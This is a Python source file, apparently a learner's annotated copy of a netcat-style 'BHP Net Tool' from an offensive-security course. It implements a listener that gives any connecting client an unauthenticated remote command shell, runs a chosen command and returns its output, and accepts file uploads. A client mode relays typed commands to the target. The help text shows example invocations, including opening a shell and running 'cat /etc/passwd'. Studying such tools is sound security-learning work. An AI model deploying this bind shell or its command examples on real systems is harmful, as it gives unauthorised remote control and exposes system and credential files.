import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
from typing import Any

#Receive a Command runs it and returns the output as a string
def execute(cmd):
    cmd = cmd.strip() # Removes not needed whitespaces, tabs, newlines, and carriage returns 
                      # on the start and end of a string : ' Hello '.stip() -> 'Hello'
    if not cmd:
        return
#check_output runs the command like in linux. shlex inputs the split cmd command like 'ls' '-la'
#Example: cmd = "ls -lah" -> shlex.split(cmd) = ['ls', '-lah'] -> check_output runs ls -lah and returns the value
    output = subprocess.check_output(shlex.split(cmd),
                                    stderr=subprocess.STDOUT)
    return output.decode() #Decodes the Response



class NetCat():
    def __init__(self,args,buffer=None):
        self.args = args
        self.buffer = buffer
        #Create a socket object
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #SOL_SOCKET => Network Layer Socket Access, SO_REUSEADDR => Allows reconnetion of same ip and port
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    
    def handle(self,client_socket):
        #Execute the execute var on the Server
        if self.args.execute: # If Value is not empty or 0
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        #Upload a file to the Server
        elif self.args.upload: # If Value is not empty or 0
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
                #Write the Received Data in the file in Binary
            with open(self.args.upload, 'wb') as file:
                file.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            #Send the Client a Success Message
            client_socket.send(message.encode())
            
        elif self.args.command: # If Value is not empty or 0
            cmd_buffer = b''
            while True:
                try:   
                    #Send the Client a Shell Prompt
                    client_socket.send(b'BHP: #> ')
                    #Receive the Command to execute from client
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    #Execute the Command and save the result
                    response = execute(cmd_buffer.decode())
                    if response:
                        #Send the Client the Result
                        client_socket.send(response.encode())
                    #Reinitialise the cmd_buffer
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()
    
    def send(self):
        #A Very simple Interactive TCP Connection to a Host on a Network
        #Connect to the Target
        self.socket.connect((self.args.target, self.args.port))
        #Send the buffer if not empty
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ""
                # Get 4096 Bytes of Data and Append to response
                while recv_len:
                    data = self.socket.recv()
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                #Print the response and take a Command from User to send to the Target
                if response:
                    print(response)
                    buffer = input("> ")
                    buffer += "\n"
                    self.socket.send(buffer.encode()) #Send to Target and encode to bytes
        except KeyboardInterrupt:
            #Add CTRL-C to terminate the connection
            print("User terminated.")
            self.socket.close()
            sys.exit()
    
    def listen(self):
        #Bind to Port
        self.socket.bind((self.args.target, self.args.port))
        #Allow 5 Connections
        self.socket.listen(5)
        while True:
            #Accept Connection
            client_socket, client_addr = self.socket.accept()
            #Create a thread and hand over the client socket to the handle function
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            #Start the thread
            client_thread.start()
    
    def run(self):
        #Method for the listener
        if self.args.listen: #Accesses Namespace(listen=true/false)
            self.listen()
        #Method for the Sender
        else:
            self.send()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BHP Net Tool",
                                     formatter_class=argparse.RawTextHelpFormatter,
                                     epilog=textwrap.dedent('''Example:
                                                            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
                                                            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
                                                            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
                                                            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
                                                            netcat.py -t 192.168.1.108 -p 5555 # connect to server
                                                            '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')#Adds a Argument that stores a Boolean
    parser.add_argument('-e', '--execute', help='execute specified command') #Saved as String or as None
    parser.add_argument('-l', '--listen', action='store_true', help='listen')#Boolean
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')#Integer
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')#String with default value
    parser.add_argument('-u', '--upload', help='upload file')#Saves as String or as None
    #Assigns the Arguments their Value
    #parse_args(["-x", "X"]) returns -> Namespace(x="X")
    args = parser.parse_args()
    #If executed empty args returns the output bellow
    #Namespace(command=False, execute=None, listen=False, port=5555, target='192.168.1.203', upload=None)
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    nc = NetCat(args,buffer.encode())
    nc.run()
    